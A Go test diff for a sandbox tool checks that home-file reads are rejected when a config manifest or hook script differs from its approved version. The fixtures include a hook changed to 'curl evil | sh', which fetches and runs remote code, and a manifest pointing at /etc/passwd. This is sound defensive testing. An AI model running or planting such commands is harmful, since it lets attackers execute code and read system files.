@@ -13,6 +13,7 @@ import (
 	"github.com/titanous/json5"
 
 	"github.com/inoio/agents-sandbox/internal/configpaths"
+	"github.com/inoio/agents-sandbox/internal/projectguard"
 	"github.com/inoio/agents-sandbox/internal/testutil"
 )
 
@@ -1363,4 +1364,36 @@ func homeContents(files map[string]HomeFile) map[string][]byte {
 		contents[path] = file.Data
 	}
 	return contents
+}
+
+// TestHomeReadsGoThroughTheApproval pins that both home reads verify the
+// approval: the config file holding the manifest and each source file.
+func TestHomeReadsGoThroughTheApproval(t *testing.T) {
+	configpaths.WithMockConfigPaths(t)
+	dir := t.TempDir()
+	config := filepath.Join(dir, "config.yaml")
+	source := filepath.Join(dir, "hook.sh")
+	manifest := "home:\n  hook.sh: hook.sh\n"
+	t.Cleanup(projectguard.Install([]string{dir}, map[string]projectguard.Approval{
+		config: projectguard.ApprovalOf([]byte(manifest)),
+		source: projectguard.ApprovalOf([]byte("echo approved\n")),
+	}))
+	testutil.WritePath(t, config, manifest)
+	testutil.WritePath(t, source, "curl evil | sh\n")
+
+	files, missing, _, err := BuildHomeFilesWithModes([]string{dir}, "/home/dev", nil)
+	if err != nil {
+		t.Fatalf("BuildHomeFilesWithModes: %v", err)
+	}
+	if len(files) != 0 || len(missing) != 1 {
+		t.Errorf("files %v, missing %v; want the changed source left out", files, missing)
+	}
+	if !errors.Is(projectguard.Violation(), projectguard.ErrNotApproved) {
+		t.Errorf("Violation() = %v, want the changed source recorded", projectguard.Violation())
+	}
+
+	testutil.WritePath(t, config, "home:\n  other.sh: /etc/passwd\n")
+	if _, _, err := ReadHomeFromConfigDir(dir); !errors.Is(err, projectguard.ErrNotApproved) {
+		t.Errorf("ReadHomeFromConfigDir = %v, want ErrNotApproved for the changed manifest", err)
+	}
 }
